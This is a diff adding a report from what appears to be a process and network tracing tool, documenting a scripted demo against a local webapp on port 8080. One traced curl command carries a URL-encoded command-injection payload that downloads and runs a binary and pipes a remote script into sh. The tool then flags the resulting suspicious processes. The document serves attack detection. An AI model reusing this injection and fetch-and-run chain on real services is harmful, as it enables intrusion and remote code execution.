@@ -1,0 +1,102 @@
+p15-trace: port 8080
+run 20261114T140712Z-ed289b2d on p15-dev, kernel 7.0.0-38-generic, captured from 14:07:12.592 UTC
+
+Trust
+  capture RUNNING, accounting invariant closed, exit 0 (stop requested)
+  kernel-skipped events: none (every hook ran for every event)
+  process tree check (ADR-0023): complete: every process alive at the end is explained, and every one gone has its exit (0 fork(s) and 0 exit(s) unexplained; counted losses: fork 0, exit 0)
+  NET records: 29 captured, 0 lost to a full ring, 0 excluded by policy (failed accepts, non-IP sockets)
+
+Summary: 1 listener(s); 4 connection(s) accepted, 4 of them from a process on this host; 4 connect(s) to the port, 0 refused or failed
+
+Listeners on port 8080
+  127.0.0.1:8080 tcp  cookie 131  listening from 14:07:12.838 (t+0.245s)  by python (1963) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+
+Connections accepted on port 8080
+  14:07:14.118 (t+1.526s)  127.0.0.1:46728 -> 127.0.0.1:8080  accepted by python (pid 1963)  (listener cookie 131)
+      client: curl (1976) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]  (exact, by TCP sequence number; connect at t+1.526s)
+  14:07:15.110 (t+2.518s)  127.0.0.1:46744 -> 127.0.0.1:8080  accepted by python (pid 1963)  (listener cookie 131)
+      client: curl (1981) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]  (exact, by TCP sequence number; connect at t+2.518s)
+  14:07:15.631 (t+3.038s)  127.0.0.1:46746 -> 127.0.0.1:8080  accepted by python (pid 1963)  (listener cookie 131)
+      client: curl (1986) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]  (exact, by TCP sequence number; connect at t+3.038s)
+  14:07:16.185 (t+3.593s)  127.0.0.1:46756 -> 127.0.0.1:8080  accepted by python (pid 1963)  (listener cookie 131)
+      client: curl (1994) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]  (exact, by TCP sequence number; connect at t+3.593s)
+
+Connects to port 8080
+  14:07:14.118 (t+1.526s)  127.0.0.1:46728 -> 127.0.0.1:8080 tcp  in progress (non-blocking)  by curl (1976) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  14:07:15.110 (t+2.518s)  127.0.0.1:46744 -> 127.0.0.1:8080 tcp  in progress (non-blocking)  by curl (1981) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  14:07:15.631 (t+3.038s)  127.0.0.1:46746 -> 127.0.0.1:8080 tcp  in progress (non-blocking)  by curl (1986) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  14:07:16.185 (t+3.593s)  127.0.0.1:46756 -> 127.0.0.1:8080 tcp  in progress (non-blocking)  by curl (1994) ← bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+
+Processes involved (14, with their ancestors)
+  pid 1963    /home/ashu/p15venv/bin/python tools/demo/webapp.py 8080
+            started t+0.183s; killed by signal 15 at t+7.358s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1885    bash tools/demo/run_demo.sh /var/tmp/p15-demo
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1884    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            unusual: runs as a different user (uid 1000 -> euid 0)
+            parent: sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1882    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            unusual: runs as a different user (uid 1000 -> euid 0)
+            parent: bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1512    bash /home/ashu/fd-vm-test3/vm_test.sh flood disk costs canary demo pack
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1323    -bash
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1322    sshd-session: ashu@pts/0                
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1217    sshd-session: ashu [priv]               
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: sshd (1214) ← systemd (1) [started before the capture]
+  pid 1214    sshd: /usr/sbin/ss
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+            parent: systemd (1) [started before the capture]
+  pid 1       /usr/lib/systemd/systemd --switched-root --system --deserialize=51
+            started before the capture (parent and program from the opening snapshot); still running at the end of the run
+  pid 1976    curl -s http://127.0.0.1:8080/
+            started t+1.489s; exited 0 at t+1.527s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1981    curl -s http://127.0.0.1:8080/about
+            started t+2.510s; exited 0 at t+2.519s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1986    curl -s http://127.0.0.1:8080/lookup?name=localhost
+            started t+3.032s; exited 0 at t+3.049s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+  pid 1994    curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh
+            started t+3.587s; exited 0 at t+4.998s
+            parent: bash (1885) ← sudo (1884) ← sudo (1882) ← bash (1512) ← bash (1323) ← sshd-session (1322) ← sshd-session (1217) ← sshd (1214) ← systemd (1) [started before the capture]
+
+Code provenance (ADR-0025)
+  pid 1882    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo: runs as a different user (uid 1000 -> euid 0)
+  pid 1884    sudo env P15_PYTHON=/home/ashu/p15venv/bin/python P15D_FLAGS=--flow tools/demo/run_demo.sh /var/tmp/p15-demo: runs as a different user (uid 1000 -> euid 0)
+  pid 1961    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1965    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1969    cat: stdin is a pipe (fed by another process)
+  pid 1972    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1978    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1983    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 1990    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2001    /tmp/.k: runs from a RAM filesystem
+  pid 2003    sh: stdin is a pipe (fed by another process)
+  pid 2005    python3 -: stdin is a pipe (fed by another process)
+  pid 2006    kworker: runs from memory (no file on disk); executable is writable by its runner; stdin is a pipe (fed by another process)
+  pid 2007    upd: runs a deleted binary; stdin is a pipe (fed by another process)
+  pid 2009    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2015    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2020    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2025    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pid 2030    tee -a /var/tmp/p15-demo/story.log: stdin is a pipe (fed by another process)
+  pipe: curl (pid 2002) -> dash (pid 2003) [same pipe inode 18847]
+
+How the joins were made
+  listener <- accept: by socket cookie (exact, ADR-0004 rule 5)
+  client -> accept: 4 exact, by the TCP client sequence number (ADR-0022); 0 inferred from endpoints on this host (0 of them with more than one candidate, the connect nearest in time taken, within 5 s either side); 0 whose connect returned after the accept; 0 same-endpoint connect(s) set aside as a different connection; 0 not found; 0 TCP record(s) without a sequence number
+  process tree: 221 processes, 143 started before the capture (142 with parent and program from the opening snapshot, 1 not in it), 0 with a missing FORK; ADR-0009 checks: 0 double exits, 0 double forks (must be 0)
+HTML report: /var/tmp/p15-demo/port-8080.html
